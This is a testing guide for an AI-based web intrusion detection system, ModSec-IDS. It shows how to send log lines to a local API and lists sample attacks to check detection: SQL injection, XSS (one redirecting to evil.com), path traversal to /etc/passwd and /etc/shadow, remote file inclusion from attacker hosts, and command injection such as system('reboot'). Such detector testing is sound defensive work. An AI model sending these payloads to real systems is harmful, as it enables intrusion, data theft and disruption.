# 🧪 Atomic Testing Guide for ModSec-IDS

This guide explains how to perform "atomic" testing—sending single, specific log lines or attack payloads to the IDS to verify its detection capabilities instanty.

## 🚀 Setup: The API Producer

For efficient atomic testing, we use the **API Log Producer**. This tool loads the heavy AI model once and listens for requests via HTTP, allowing for instant predictions without reloading the model for every test.

1.  **Start the API Producer** (in a separate terminal):
    ```bash
    uv run python tools/api_log_producer.py
    ```
    *   It listens on `http://localhost:8000`.
    *   It also publishes results to the Dashboard (if running).

2.  **Start the Dashboard** (optional, but recommended for visualization):
    ```bash
    uv run python idsdashboard.py --semantic
    ```

---

## 🛠️ Testing Tools

### 1. `tools/test_sample.py` (CLI Tool)
This script is a convenient wrapper for sending tests to the API (or loading the model locally if the API isn't running).

**Usage:**
```bash
uv run python tools/test_sample.py "<LOG_LINE>"
```

**Examples:**

*   **SQL Injection:**
    ```bash
    uv run python tools/test_sample.py "GET /login.php?user=' OR '1'='1"
    ```

*   **XSS:**
    ```bash
    uv run python tools/test_sample.py "GET /search?q=<script>alert(1)</script>"
    ```

*   **Interactive Mode:**
    ```bash
    uv run python tools/test_sample.py --interactive
    ```
    *   Type payloads and press Enter to see results instantly.

### 2. `curl` (Direct API Access)
You can test directly from the command line using `curl`. This is the fastest method if the API producer is running.

**Syntax:**
```bash
curl -X POST -d "<LOG_LINE>" http://localhost:8000/analyze
```

**Examples:**

*   **LFI (Local File Inclusion):**
    ```bash
    curl -X POST -d "GET /download.php?file=../../../../etc/passwd" http://localhost:8000/analyze
    ```

*   **RCE (Remote Code Execution):**
    ```bash
    curl -X POST -d "POST /upload.php?cmd=cat /etc/passwd; whoami" http://localhost:8000/analyze
    ```

---

## 📋 Test Cases

Use these samples to verify detection for each class.

### 🔴 SQL Injection (SQLi)
*   `GET /index.php?id=1 UNION SELECT user, password FROM users`
*   `POST /login.php?u=admin'--`
*   `GET /news.php?id=1+and+1=1`

### 🟠 Cross-Site Scripting (XSS)
*   `GET /search.php?q=<img src=x onerror=alert(1)>`
*   `POST /comment.php?msg=<svg/onload=alert('XSS')>`
*   `GET /?name=<script>document.location='http://evil.com'</script>`

### 🟡 Local File Inclusion (LFI)
*   `GET /index.php?page=../../../../etc/passwd`
*   `GET /view.php?file=..\..\windows\win.ini`
*   `GET /image.php?path=/var/log/apache2/access.log`

### 🟣 Remote File Inclusion (RFI)
*   `GET /index.php?page=http://attacker.com/shell.txt`
*   `GET /loader.php?src=http://evil.com/malware.php`

### 🔴 Remote Code Execution (RCE)
*   `POST /upload.php?cmd=id; ls -la`
*   `GET /ping.php?ip=127.0.0.1 | cat /etc/shadow`
*   `GET /calc.php?value=10; system('reboot')`

### 🟢 Normal Traffic (False Positive Check)
*   `GET /wp-content/themes/twentytwenty/style.css HTTP/1.1`
*   `POST /wp-login.php HTTP/1.1` (Should be normal, though sensitive)
*   `GET /about-us/ HTTP/1.1`

---

## 📊 Interpreting Results

The tool will output:
*   **Status:** 🟢 SAFE or 🔴 ATTACK
*   **Class:** The specific attack type detected (e.g., `sqli`, `xss`).
*   **Confidence:** How sure the model is (0-100%).
*   **Probabilities:** A bar chart showing the score for each class.

**Example Output:**
```
📝 Analyzing Sample:
   GET /index.php?id=1 UNION SELECT 1,2,3--

🧠 Prediction Result:
   Status:     🔴 ATTACK (SQLI)
   Confidence: 98.50%

📊 Class Probabilities:
   sqli                : ███████████████████ 98.50%
   normal              :                     1.20%
```
